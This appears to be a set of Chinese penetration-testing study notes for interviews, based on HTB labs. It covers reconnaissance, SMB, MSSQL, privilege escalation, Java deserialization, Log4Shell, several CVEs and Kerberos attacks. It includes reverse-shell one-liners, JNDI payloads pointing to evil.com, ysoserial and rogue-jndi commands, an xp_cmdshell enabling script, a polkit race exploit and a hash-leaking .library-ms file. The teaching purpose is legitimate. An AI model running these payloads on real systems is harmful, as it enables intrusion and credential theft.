# 前言：我认为这才是重点，面试前多花时间看看

# /etc/hosts

这是linux上用于**IP地址到主机名映射**的系统文件。

尤其在HTB靶机运行web服务的时候，大部分情况都会将你的IP访问重定向到域名，因此需要添加映射到这个文件中，才能访问web服务。

浏览器在解析域名的时候，先查找浏览器的DNS缓存，然后找主机的DNS缓存，在然后就是这个**hosts文件**。还没有继续路由器缓存到迭代DNS查询。

内网渗透中，这个文件可能包含内网主机对应的内网IP地址，重要性不言而喻，直接给到顶级

# Nmap

这个不用分析，直接给到夯。

最常用的端口扫描工具，像MSF框架都集成了nmap，含金量不必多说。

nmap常用参数：

| 参数             | 作用                                              |
| ---------------- | ------------------------------------------------- |
| 空，不加任何参数 | SYN扫描，只扫1000个最常见端口                     |
| -sV              | 显示服务的版本信息                                |
| -v               | 显示扫描过程的详情                                |
| -sC              | 等于  --script=default   使用默认脚本探寻更多信息 |
| -O               | 探测操作系统类型                                  |
| -sn              | ping 扫描     只探测主机是否存活，不扫端口        |

扫描类型：

| 参数          | 作用                                                  |
| ------------- | ----------------------------------------------------- |
| -sn           | ping 扫描，只扫主机是否存活                           |
| -sS           | SYN半开放扫描，只发送SYN包，不会被记录                |
| -sT           | TCP完全连接扫描，调用connect()完成TCP三握手           |
| -sU           | UDP扫描                                               |
| -sN、-sF、-sX | 隐蔽扫描，发送错误的数据包，端口关返回RST，开放无响应 |
| -sA           | ACK扫描，发送ACK包，判断端口有没有被防火墙过滤        |

   Nmap所识别的6个端口状态。

1.    open(开放的)
      	端口开放，服务可访问
2.    closed(关闭的)
          关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 
3.    filtered(被过滤的)
          由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。这使得扫描速度明显变慢。
4.    unfiltered(未被过滤的)
          未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。
   只有ACK扫描会出现这种状态。
5.    open|filtered(开放或者被过滤的)
          当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。
6.    closed|filtered(关闭或者被过滤的)
          该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。

# 服务及端口

| **远程管理服务**     |                                       |                                                       |
| -------------------- | ------------------------------------- | ----------------------------------------------------- |
| 20、21               | FTP（文件传输协议）                   | anonymous登录                                         |
| 22                   | SSH（安全外壳协议）                   | linux辅助登录                                         |
| 23                   | Telnet（远程终端协议）                | 明文传输，wireshark数据包                             |
| 3389                 | RDP（远程桌面协议）                   |                                                       |
| 5985                 | Winrm（windows远程桌面，比RDP更轻量） | windows辅助登录   evil-winrm连接                      |
| **局域网服务**       |                                       |                                                       |
| 53                   | DNS（域名系统）                       | AD域特征                                              |
| 111、2049            | NFS（网络文件系统）                   |                                                       |
| 135                  | RPC（远程过程调用）                   |                                                       |
| **445**              | **SMB**（网络文件共享协议）           | smbclinet连接，-L查看共享                             |
| **389**              | **LDAP**（轻量目录访问协议）          | 域渗透  nmap -sV -p拿域名                             |
| **互联网服务**       | **（都是明文）**                      |                                                       |
| 25                   | SMTP（简单邮件传输协议）              |                                                       |
| 110                  | POP3（邮局协议版本3）                 |                                                       |
| 80、8000、8080、8888 | HTTP（超文本传输协议）                |                                                       |
| **中间件**           |                                       |                                                       |
| 7001                 | weblogic                              |                                                       |
| 8443                 | UniFi   Network                       | 它使用Apache  Log4j组件                               |
| **数据库**           |                                       |                                                       |
| **1433**             | **SQL Server**（数据库管理系统）      | impacket-mssqlclient交互                              |
| 1521                 | Oracle（甲骨文数据库）                |                                                       |
| **3306**             | **MySQL**（数据库）                   | MariaDB是Mysql的社区升级版本，mysql -u -p -h直接交互  |
| 5000                 | Sybase/DB2（数据库）                  |                                                       |
| 5432                 | PostgreSQL（数据库）                  |                                                       |
| 6379                 | Redis（数据库）                       | redis-cli交互  select 0选数据库，keys *查看所有键值对 |
| 27017-27018          | MongoDB（数据库）                     | mongo工具                                             |

# OWASP

四年一换，今年的榜单官网是十一月的第一周出

列出2021 OWASP TOP10

**A01：失效的访问控制**  API滥用；CORS配置错误；用户权限配置不当；提权漏洞；

**A02：加密机制失效** 弱密码；不安全的算法；聚焦加密

**A03：注入**     各种注入

**A04：不安全的设计**    业务逻辑错误；留有后门；水平访问越权

**A05：安全配置错误**   各种安全策略配置错误，比如CSP，CORS；XXE被归入此类

**A06：易受攻击和过时的组件**    使用了含有已知漏洞的组件

**A07：身份识别和认证失败**          弱密码爆破；明文存储密码；keepass数据库泄露

**A08：软件和数据完整性故障**     反序列化被归入此类

**A09：安全日志与监控故障**           日志问题

**A10：服务端请求伪造**                SSRF

# Responder

Responder 是一款开源的网络协议欺骗工具，主要用于在本地网络中捕获和利用**LLMNR/NBT-NS/MDNS**协议中的漏洞来获取NTLM哈希。它内置是可以伪造如SMB等服务。

比如在Starting Point的Responder靶机中，我们利用web页面的远程文件包含漏洞访问：

```
?page=//10.10.16.31/somefile
```

responder提前在攻击机器监听网卡，伪造一个SMB服务：

```
responder -I tun0
```

就可以监听到NTLM哈希。

这里是通过RFI漏洞让靶机主动连接了，还有一种被动连接的情况就是利用LLMNR/NBT-NS/MDNS协议：

这三个协议相当于是本地网络中的DNS服务，在本地网络中通过发送多播或广播查询主机名对应的IP。攻击者的机器可以第一个响应，伪装成目标主机，让靶机连接。

这里的关键是要等靶机访问一个不存在的主机名，这样才会DNS查询失败后，在本地网络发起**LLMNR/NBT-NS/MDNS**查询，我们才能伪装成功。这种被动等待并进行欺骗的攻击模式很像ARP欺骗。

# 目录探测

目标有

1. robots.txt文件，这是一个“君子协议”，告诉爬虫哪些文件不能爬取
2. .git目录，git仓库泄露，没有删除
3. 源码文件，.bak   back.zip等等。
4. 没有显示的注册页面，登录页面，后台管理页面等等
5. **子域名**等

工具：

1. burpsuite   爆破模块用字典跑url
2. gobuster   有多个工作模式  fuzz模糊测试    vhost虚拟主机模式(一个IP多个域名)    dir经典爆破等等
3. dirsearch   经典工具，kali自带，依赖字典
4. dirbuster   特点是有图形化界面，用户友好

比如子域名探测到s3.xxx.xxx   s3开头的亚马逊云存储服务，用官方工具awscli连接，查看S3存储桶中的对象。（每个对象通过桶内键名唯一标识）

可以用gobuster的s3模式探测所有存储桶

# 内网代理

先讲端口转发：端口转发指的是**将发送到某个网络节点（IP:Port）的流量，重定向到另一个网络节点（IP:Port）**。也就是说一般的端口转发是在特定端口上的。但是我们不仅想当问一台内网机器的某个端口，而是想访问各种内网服务。

这个时候就需要动态端口转发，其实就是使用**SOCKS代理**服务

我们常用的代理是http代理，比如burpsuite抓包。功能是代理客户机的HTTP访问。而SOCKS代理则是可以代理任何协议。它工作在会话层，在传输层和应用层之间，不关心应用协议类型，只关注要转发到的目标。

渗透测试常有一种情况：获得了一台边界主机的webshell，而它处于的内网中还有其他主机。我们无法直接访问内网ip，于是将边界主机当作跳板机，也就是使用代理，帮助转发攻击机的流量到内网中。

端口转发工具有`ssh、lcx`等

代理工具主要是`EarthWorm`，优点是单文件体积小，因为我们是要上传代理工具到跳板机的。

配置好代理后还需要让应用程序走这个代理，常用工具`Proxychains (Linux)`  `SocksCap / Proxifier (Windows)`

# 内网穿透

核心思想通过一个位于公网的服务器作为“桥梁”，让公网上的用户能够访问到你内网中的设备。用过`Coplar`  `sakura穿透`等

使用场景有：玩游戏当主机开服、渗透测试要反弹shell没有公网IP

# SMB服务

SMB全称是Server Message Block，这是windows的文件共享协议。支持NTLMv2、Kerberos认证

我们可以使用`smbclient`工具的`-L`参数，或者`nxc smb --shares`查看可以访问的共享。

一个标准的扫描结果如下：

```
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

`ADMIN$` 、`C$`和 ` IPC$`这三个是默认共享，由系统自动创建用于管理。共享名以`$`结尾表示通常**隐藏**并且**需要管理员权限**访问

`NETLOGON`和`SYSVOL`是AD域环境下才有的，是DC（域控制器）自动创建。

在渗透测试中，我们通常先需要一对用户密码来访问SMB服务获取非默认共享中的一些可利用信息。这个步骤比较前面，所以在非域环境中，有时是不设置密码的，因为不需要横移没有那么多账户。

在AD域环境中，SMB服务还可以用来枚举域用户，枚举组等：

```
nxc smb   ...     --users
```

出来的用户名可以用我们已知的密码做密码喷洒

# 数据库

渗透测试比较常见的

1. Mysql                     mysql交互
2. MS SQL Server     impacket-mssqlclinet交互
3. Redis                      redis-cli交互

如果有web服务，可以考虑SQL注入，主要使用**sqlmap**工具，一些常用参数：

| 参数                             | 作用                                                         |
| -------------------------------- | ------------------------------------------------------------ |
| -r                               | 从文件加载HTTP请求（例如Burp抓包数据）,适用于需要处理Cookie或POST数据的复杂场景。 |
| --cookie                         | 设置cookie                                                   |
| --delay                          | 设置每次HTTP请求之间的延迟（秒）                             |
| --dbs                            | 枚举数据库                                                   |
| -D db_name -T tbl_name --columns | 枚举指定数据表中的所有列                                     |
| **--os-shell**                   | 尝试获取目标操作系统的命令行shell                            |

渗透测试中重点一般是`--os-shell`

如果没有web服务，我们往往可以通过一些敏感文件找到连接数据库的账户密码。比如最常见的是在网站源码中，或者名字为`db  db_passwd`的一些文件。Mssql比较特殊，它支持`--windows-auth`参数使用域账户密码进行连接，比如：

```
impacket-mssqlclient  ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```

数据库连接上了以后：

1. 查询敏感数据，有可能会有所有用户和密码
2. 通过命令执行反弹shell，这通常是在我们还没有拿到shell或者远程登录条件的时候

关于第二点，重点讲一下`xp_cmdshell`，这是SQL Server一个臭名昭著的存储过程，可以执行系统命令，因此一般情况下是禁用的，需要管理员权限启用。当我们有账户密码却无法通过winrm等远程连接，而对应数据库又有管理员权限时,可以连上mssql执行：

```
SELECT is_srvrolemember('sysadmin');#查看有无管理员权限
EXEC xp_cmdshell 'net user';        #尝试执行命令，看xp_cmdshell是否启用
启用：
-- 首先展示高级选项
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
GO

-- 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO

-- 完成后，可以再次隐藏高级选项（可选）
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
GO
```

**sp_configure**是 SQL Server 中用于显示或更改服务器全局配置设置的系统存储过程

然后执行系统命令反弹shell即可

# 反弹shell

反弹shell有很多“姿势”，这里讲的是一些方式：

1. 最简单直接的上传webshell并连接
2. 上传nc程序利用nc反弹(windows)
3. bash命令，powershell命令反弹
4. 本地准备反弹文件，靶机wget下载并执行

kali在`/usr/share/webshells`下有一些自带的webshell，jsp  php等类型都有。一般情况下是够用了，但是在连接windows时，建议使用更现代，错误处理更好的webshell。

还有就是“哑shell”升级，为了支持`Ctrl + C`和`fg`等，需要实现TTY升级：

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

但这一般没用

直接看有点乱，我们列举遇到过的具体场景：

1. xp_cmdshell 命令执行，上传nc64.exe，然后反弹shell
2. 

# 提权

这是一个很大的板块，涵盖了很多方面。只从我遇到过的方面进行总结：

## Linux提权

首先是**LinPEAS**扫描工具。linux提权大致三个方向：

1. CVE漏洞提权
2. sudo权限提权     
3. suid提权            

对于有sudo权限或者suid位的程序，如果是linux内置的程序如cat  vim等，看CTFObins指引。如果是一个未知程序，可以劫持它用到的指令或者动态链接库。

列出遇到的场景：

1. 调试程序`bugtracker`有suid，所有者是root。运行时发现会调用cat打印信息，我们直接在/tmp中创建恶意cat程序，然后修改环境变量`export $PATH=/tmp:$PATH`,这样`bugtracker`就会以root权限执行恶意cat程序
2. vi编辑器以root权限执行：直接命令模式`:!/bin/bash`逃逸一个有root权限的shell

## Windows提权

主要两类：本地windows提权，和windows域中的提权

本地首先是**winPEAS**扫描工具，找可以提权的CVE漏洞，还有可以利用的`SexxxxxPrivilage`权限,剩下就是一些敏感文件如`ConsoleHost_history.txt`

权限可以通过`whoami /all`或者`whoami /priv`查看。这里的权限就是你用户的**访问令牌**中的权限列表，需要注意的权限有如下：

| 权限名字                    | 描述                                                         |
| --------------------------- | ------------------------------------------------------------ |
| **SeDebugPrivilege**        | 允许持有者向任何进程附加调试器，从而可以读取和修改其内存。这是安全工具和恶意软件都梦寐以求的权限，通常只有管理员才有。mimikatz |
| **SeImpersonatePrivilege**  | 允许一个服务在验证了用户身份后，以该用户的权限运行代码。有这个权限可以执行一系列“土豆”攻击来提权 |
| **SeManageVolumnPrivilege** | 拥有此特权的用户或进程可以对整个卷（例如 C: 盘、D: 盘）进行维护操作。 |
|                             |                                                              |
|                             |                                                              |

### SeManageVolumnPrivilege

用github上的SeManageVolumeExploit获取整个C盘的权限，然后劫持DLL。（用恶意dll文件覆盖原来的系统dll）github作者建议是覆盖

```
C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
```

还有就是C:\Windows\System32\wbem\tzres.dll，可以通过systeminfo触发，反弹设立了的权限是NT AUTHORITY\NETWORK SERVICE，一般有模仿权限，做土豆攻击到nt authority\system。然后直接下载ntds.dit，impacket-secretdump拿管理员密码哈希（EFS加密）

### 土豆攻击

土豆攻击原理就是利用Windows身份验证机制中的缺陷，诱骗系统高权限账户（如SYSTEM）向攻击者控制的进程进行身份验证，然后窃取并模仿（利用SeImpersonatePrivilege权限）其令牌（Token）。

# Impacket工具包

| 名称              | 作用                                                         |
| ----------------- | ------------------------------------------------------------ |
| psexec.py         | 通过smb服务获得命令执行条件（一个shell）。拿到高权限账户密码可以通过这个登录 |
| mssqlclinet.py    | 用于连接SQL Server数据库                                     |
| secretsdump       | 查看dtds.dit                                                 |
| impakcet-ownerdit | 修改域中对象所有者                                           |
| impacket-dacledit | 修改对象的DACL                                               |
|                   |                                                              |

# John &  Hashcat

最常用的两个哈希爆破工具，字典常用rockyou.txt，同时kali在`/usr/share/wordlists`下还有很多其他字典

John配套的**提取哈希工具**较多，hashcat速度比较快。常用john配套工具`xxx2john`提取哈希，然后给hashcat跑

注意hashcat需要`-m`指定哈希类型，而John虽然可以自动识别，但是还是很多情况还是要手动指定类型。hashcat是给每个哈希类型赋予了一个编号，不知道编号是什么直接`hashcat --help | grep`查询即可。

常用的哈希提取工具有：`zip2john` 、`keepass2john`等

# JNDI注入

JNDI全称是java命名和目录接口，它的作用是将服务名称和对象关联，使得开发人员可以统一通过服务名称访问对象。比如DNS服务，LDAP服务，RMI等都可以通过JNDI API统一处理。

JNDI需要多种**服务提供商**提供服务，然后统一用同一套JNDI API访问，这意味程序员不需要关心底层的服务到底是RMI还是LDAP，只需要使用统一的JNDI接口进行查找即可。底层服务有：

- **RMI** - Java远程方法调用
- **LDAP** - 轻量级目录访问协议
- **CORBA** - 公共对象请求代理体系结构
- **DNS** - 域名系统

这里介绍RMI（Remote Method Invocation）。这是java语言实现的一种基于类的远程RPC调用。RMI一般是使用JRMP协议实现，但是在weblogic中，weblogic可以选择使用独有的t3协议实现RMI。后面webglogic  T3反序列化漏洞会讲到

JNDI注入是lookup()查询的目标被控制，服务器会查询一个恶意类。这里的关键是**会自动远程加载并实例化这个恶意类**，也就是执行类中的恶意代码。

JNDI注入本质上归类为**对象注入**，而反序列化是最常见的一种注入对象的方式。因为序列化本身就是为了传输对象，这也能看出来JAVA反序列化和JNDI注入的关系了。

# JAVA反序列化

Java中，任何实现了java.io.Serialible接口的类的对象都可以序列化。反序列化漏洞和php反序列化类似，主要是利用一些自动执行的“魔术方法”，比如readObject()方法。

我们最终目标是利用像php的`system（）`、python的`os.popen()`这些函数来执行命令。php的函数都是内置的，任何一个程序都是拿来就用。python要使用os.popen就要引入os模块。而java执行系统命令常用`java.lang.Runtime`类的实例化对象的`exec`方法，但是我们怎么搞出来一个它的实例化对象呢？

## 反射

这里就要用到java的反射机制。反射指的是在程序运行过程中，可以动态获取一个类的属性，方法（静态方法属于类），并且动态调用它的实例化对象的属性和方法。

比如：

1. 使用class.forName()，通过类名获取`java.lang.Runtime`类对象（java中类也是对象）
2. getMethod()方法找这个类的静态方法`getRuntime`
3. 通过`getRuntime`可以获取一个Runtime类的实例
4. getMethod()方法找实例中的exec()方法
5. 通过invoke()方法调用exec()执行系统命令

java反序列化利用中可以使用多个类相互配合，最直接形成一条利用链。比较有名的就是Commons Collections，这是一个非常流行的Java基础库。

java很多存在序列化功能的第三方库，比如Apache Shiro，就可以利用Common Collections链构造的恶意序列化数据。

**Java反序列化漏洞为JNDI注入提供了一个稳定、隐蔽且强大的“触发入口”。**

## FastJson

java反序列化也可以实现JNDI注入，比如fastjson库，可以通过指定 `@type` 属性，告诉程序这个JSON字符串**应该被还原成哪种具体的Java类**。早期版本的Fastjson在处理这个 `@type` 时，会**自动去加载并实例化指定的类**。如果这个类位于某个远程的JNDI资源上，它就会**触发JNDI查询**！比如：

```
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap(rmi)://evil.com/exploit",
  "autoCommit": true
}
```

## Apache shiro

Apache shiro也是一个常用的java库，它也能也用JNDI注入。简单概括就是它比fastjson直接序列化多了一个加密功能，但是**密钥是硬编码的，且公开的**（v-1.2.4）。这是有点搞笑了。

详细来说他有个Remember Me功能，是把用户信息序列化再加密放在Cookie里面，当作身份凭证。服务器拿到cookie先解密看看，成功就认为没有被篡改，然后就反序列化对象。因为我们能知道密钥，所以可以直接改序列化对象。我们既可以直接靠如Commons Collections利用链执行一些恶意代码，也可以做一个JNDI查询，实现JNDI注入。

这里说是加密，但是它其实是签名的功能。只是内部用的是对称密码（AES），只有一个密钥，就也叫加密了。实际上服务端只判断能不能解密，不关心内容，也就是只看有没有被篡改。

## Ysoserial

```
java -jar ysoserial.jar CommonsCollections1 [command] > payload.ser
```

生成一个序列化文件，这里的payload是CommonsCollections，也可以换做其他payload。比如**JRMPClient & JRMPListener**，这两个Payload通常配合使用，用于**实现反向连接和远程代码执行**:

```
java -jar ysoserial.jar JRMPClient "192.168.1.10:1099" > payload.ser
```

生成序列化文件，然后启动JRMP服务器监听：

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"
```

发送文件之后，就可以拿到shell

这里本质是发送了两次payload，第一次JRMPClient让目标连接JRMP服务器，第二次JRMPListener发送反弹shell的payload。

## 编码

java反序列化和JNDI注入一样，最后都是靠`Runtime.getRuntime().exec()`执行系统命令，而这个函数无法正确处理反弹shell指令中的特殊符号，比如重定向符之类。所以要进行bash64编码：
```
bash -c {echo,xxx}|{base64,-d}|{bash,-i}
```

# LOG4Jshell

Log4j是一个日志记录的库，它会把程序运行的信息（包括用户输入！）写到日志文件里。比如攻击者在登录框的用户名写一个恶意的JNDI查询如`${jndi:ldap://evil.com/x}`，Log4j会把这个查询记录到日志里。而**Log4j 2.x 版本中的 JNDI 查找功能缺乏必要的安全验证**，也就是他会直接执行日志中记录的JNDI查询，触发JNDI注入。

v6.4.54的UniFi Network的log4jshell的注入点在`/api/login` POST提交的JSON数据中的remember字段。我们在其中协商一条jndi查询的语句：

```
"remember":"${jndi:ldap://evil.com/x}"
```

这里写入的是一个JNDI url，其结构为：

```
${jndi:[协议]://[服务器地址]:[端口]/[资源路径]}
```

我们不能像fastjson触发JNDI查询一样，直接使用`[协议]://[服务器地址]:[端口]/[资源路径]`比如`ldap(rmi)://evil.com/exploit`，因为在log4j中，需要解析 `${...}` 表达式，才能触发查询。

（`${}`是一个变量插值写法，log4j会自动尝试解析）

为了提供JNDI查询服务返回恶意类，我们需要搭建恶意的RMI/LDAP服务器。有很多工具可以使用，比如`rogue-jndi`

我们要返回的恶意类执行的代码最简单就是反弹shell，经典指令是：

```
bash -i >& /dev/tcp/{Your IP Address}/{A port of your choice} 0>&1
```

为了特殊字符被Java运行时、Bash或中间的网络设备错误地解析，导致命令执行失败，我们需要进行base64编码。这和JAVA反序列化中的命令执行情况是一样的，比如`java.lang.RunTime.exec()`,编码后指令如下：

```
bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}
```

因此可以使用`roguejndi`如下搭建恶意服务器:

```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```

触发后就能在监听的端口上拿到shell

# Apache Struts文件上传漏洞（CVE-2024-53677）

Apache Struts是美国阿帕奇（Apache）基金会的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架。本质上是**OGNL表达式注入**，Struts2 框架的核心机制之一就是 **“将 HTTP 请求参数自动绑定到 Action 对象的属性”**。这个机制是由 OGNL 驱动的。struts2会自动提取HTTP请求中的参数作为OGNL 表达式执行：

```
POST /upload.action HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
----WebKitFormBoundary
Content-Disposition: form-data; name="Upload"; filename="1.txt"
Content-Type: text/plain
example text
----WebKitFormBoundary
content-Disposition: form-data; name="top.UploadFileName"
shell.jsp
----WebKitFormBoundary--
```

这里就是通过top访问栈，修改了最后的Action类的上传文件名字

# WebLogic漏洞（CVE-2018-2628）

这里主要讲CVE-2018-2628，也就是WebLogic的T3协议反序列化漏洞。T3协议是weblogic独有的实现RMI的协议，它本质上可以看作JRMP协议的增强。它会自动反序列化，且存在反序列化漏洞。

weblogic的端口是7001，我们可以--script查看是否启用T3协议

```
nmap xxxx -p 7001 --script=weblogic-t3-info
```

探测是否存在CVE-2018-2628，可以使用单独的探测脚本，也可以使用`weblogicScan`这种集成的weblogic漏洞探测工具。

网上的exploit有两种：

1. 生成和ysoserial的JRMPClient模板一样的payload（连接我们的JRMP服务器），并通过T3协议发送给weblogic(进行握手之类)
2. 直接利用一些能写文件的利用链写入一个webshell。

# Overlay文件系统提权漏洞（CVE-2023-0386）

Overlay文件系统：分为三层，lower层,upper层,merged层。overlay真正挂载的是merged层，它合并展示了lower层和upper层的内容。lower层和upper层都可以有自己的文件系统，lower层只读，upper层只写。

所以我们如果在merged层修改一个lower层有而upper层没有的文件，系统会将文件从lower层拷贝到upper层，再修改。

我们在lower挂载用FUSE自定义的文件系统，包含一个恶意的设置了suid位的属于root的文件。我们可以通过在merged层修改这个文件（touch即可，touch会修改时间）导致它被copy到正常文件系统的upper层，在upper层就可以以root执行这个文件，完成提权。

为了在FUSE创建一个uid=0的属于root用户的文件，我们使用`unshare`创建一个新的用户命名空间 ，原来uid=1000的文件在这里有了1000->0的映射，但是copy到upper层没有0->1000的映射修改回去，因此uid=0就被保留了

利用：

1. 准备一个创建FUSE系统的程序并运行，创建一个显现属于root（实际uid=1000）设置了suid位的恶意文件
2. mkdir准备文件夹，用于overlay挂载。
3. `unshare -Urm`进入新的空间，获取虚拟root权限，恶意文件的uid被修改为uid=0
4. 挂载overlay文件系统，FUZE系统挂载到lower，upper挂正常系统，merged是overlay
5. 在merged中touch一下恶意文件，触发拷贝到upper中
6. 退出命名空间在upper中执行提权文件完成提权。

# Polkit权限提升漏洞（CVE-2021-3560）

## 原理

要想理解这个漏洞，就要从linux的DBUS讲起。

D-BUS是一套linux中的IPC机制，和信号作用一样。信号更底层更原始，是内核级中的，也更加简单，所有信号的含义都是预定好的。

D-BUS有一个中心化的守护进程（`dbus-daemon`）来路由所有消息，管理连接，并提供一些高级功能如服务激活。它管理两条总线，一条系统总线（系统服务），一条会话总线（用户应用）。

D-BUS支持**方法调用**以及**信号机制**。方法调用类比RPC，通过总线发送序列化的方法调用信息给系统服务，获取响应再反序列化。信号机制就是通过总线发送信号，比如：

> 当用户使用hostnamectl set-hostname命令更改主机名时，systemd-hostnamed不仅执行修改操作，还会通过DBus发送一个PropertiesChanged信号，通知系统其他进程主机名发生变化。

可以通过dbus-send工具直接向总线发送DBus消息

回头看Polkit，这是一个linux中的授权框架（pkexec则是polkit服务的命令行工具）。当非特权进程需要访问特权进程服务时，特权进程会通过D-BUS向Polkit的服务进程 polkitd 请求权限认证。

polkitd再验证权限时候，会向总线查询uid（和pid），如果总线返回的uid为0，那么polkit会立刻授权。如果不为0，就要求客户端打开一个窗口获取用户输入密码，发送给polkit。

如果再polkit查询uid时客户端断开连接，要么主线会返回一个错误。polkitd看到错误立马结束查询，但是这个错误被忽视了没有处理，导致就算出错也会继续执行`uid == 0 ?`的判断。而uid一开始就被初始化为0，因此判断成功，进行授权。

## 利用

通过`dbus-send`工具向总线发起创建用户的请求，而`CreateUser` 本身是一个需要特权的操作，会向polkit请求授权。

```
dbus-send --system--dest=org.freedesktop.Accounts --type=method_call --print-reply/org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:zeeker string:"Zeeker Security"int32:1
```

多次测试指令执行时间，然后再次运行指令加上``& sleep0.xxx s;kill$!`。多次尝试sleep的时间，确保在查询uid的时候断开连接。一旦利用成功，我们就创建了一个**特权用户**，然后利用同样的方法使用`SetPasswd`设置密码。这样就可以登录到特权用户了，`sudo su`切换到root

# Windows文件资源管理器欺骗漏洞(CVE-2025-24071)

## 原理

此漏洞的核心是`.library-ms` 文件。此文件本质上是**一个XML格式的配置文件**，用于定义Windows资源管理器中的"库"（例如文档、图片库）。其XML结构内包含一个 `<simpleLocation>` 标签，其中的 `<url>` 项可以指向一个网络位置（如 `\\192.168.1.116\shared`）。用户解压一个包含`.library-ms` 文件的ZIP或RAR压缩包时，**Windows文件资源管理器会自动解析此文件**。一旦读取到在`<url>`中嵌入的SMB路径，就会自动触发NTLM验证流程，泄露NTLMv2哈希。

## 利用

写一个恶意`.library-ms`文件，嵌入攻击者的SMB服务路径：

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\攻击者IP\共享名</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

然后responder监听网卡，捕获NTLM哈希

# AD域渗透

**AD域**（Active Directory Domain）是微软Windows网络中的一个概念，它是一种计算机网络的形式，其中所有用户账户、计算机、打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。AD域在企业内网中扮演了重要的角色，集身份验证和服务管理于一身，提供了一种集中管理网络资源的有效方式。

核心是**横向移动**  横向移动依赖AD域中不安全的ACL权限配置。

我做到的都是单DC机器的环境。所以很少用到mimikatz。mimikatz的核心功能是从内存的lsass进程中挖掘密码哈希，但是这通常需要system权限。场景是控制边缘计算机的system再想办法横移。但是只有单DC机，就用不上了。

## NTLM

NTLM本质是挑战-应答协议。服务端发送随机值作为挑战，客户端用key进行HMAC算法进行应答。

注意这里的key就是常说的NTLM哈希，本质就是用户的长期密码通过哈希算法计算出来的哈希值。

NTLM哈希实际指的就是NT哈希，历史上曾使用LM哈希，但是因为安全问题被弃用。我们可以看到`LM:NT`形式的哈希对，前半部分的LM哈希固定为一个空值

## Kerberos

NTLM可以用于工作组环境或者windows域环境，而Kerberos专为域环境而生。

注意认证要求两台机器系统同步，可以用`ntpupdate`，要先关闭本机的时间同步服务`systemd-timesyncd`

一次kerberos有四个数据包：

1. AS-REQ             ：启动预认证则发送用长期密码派生的密钥加密的时间戳
2. AS-REP              ：第一部分时用户长期密码派生的密钥加密的会话密钥等，第二部分是由krbtgt的长期密码派生的密钥加密的TGT（包含PAC和会话密钥）
3. TGS-REQ          ：拿着会话密钥请求ST（包含PAC）
4. TGS-REP            ：返回用服务长期密码派生的密钥加密的ST

DC域控制器的重要功能就是提供KDC服务。KDC包含认证服务器AS和票据授予服务器TGS。先向AS要TGT，再拿TGT向TGS要ST。

所以如果捕获了完整的四个包，我们可以从前两个包破解用户密码，第四个包破解服务密码（也就是kerberoasting）。

### PKINIT

这是kerberos协议的扩展，允许使用客户端证书进行认证。传统kerberos在AS-REQ和AS-REP中的数据都使用了用户密码派生的密钥，这很不安全（抓包破解）。因此使用公钥密码学，KDC会存储用户的个人证书，用户在预认证的时候使用证书私钥签名时间戳，KDC使用证书的公钥检验。AS-REP的第一部分使用证书公钥加密，这样用户可以使用私钥解密。

### U2U

也是kerberos协议的扩展，PKINIT并不能避免kerberoasting攻击。很多情况下，客户端通过kerberos向TGS认证要访问的服务不是系统运行的服务，而是以用户身份运行的。这时加密ST的就成了另外一个用户的长期密码派生的密钥，执行kerberoasting攻击就可以获得其密码。

为了解决这个”用户到用户“的认证问题，就出现了U2U协议。A想找TGS要一张B服务的ST时，带上A和TGT（验证自己身份）和B的TGT（B要提前想办法把TGT给A），TGS收到请求生成一个A到B的服务票据ST，这个服务票据是**用B的TGT会话密钥加密**（解密B的TGT拿到），而不是用B的长期密码派生的密钥。

这个协议可以用来在ADCS攻击中，拿到伪造证书后获得NTLM哈希，因为为了兼容不支持kerberos认证的服务，PAC中包含了NTLM哈希。我们先PKINIT协议向AS请求拿到TGT和会话密钥，然后通过U2U请求到自己的服务票据，这样收到的ST就是用已知的会话密钥加密，我们解密就可以拿到PAC,certipy的auth模式就是这个原理拿NT哈希

```
└─# certipy-ad -debug auth -pfx ryan.k.pfx -dc-ip 10.10.11.71 
Certipy v5.0.3 - by Oliver Lyak (ly4k)
...
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```



## BloodHound

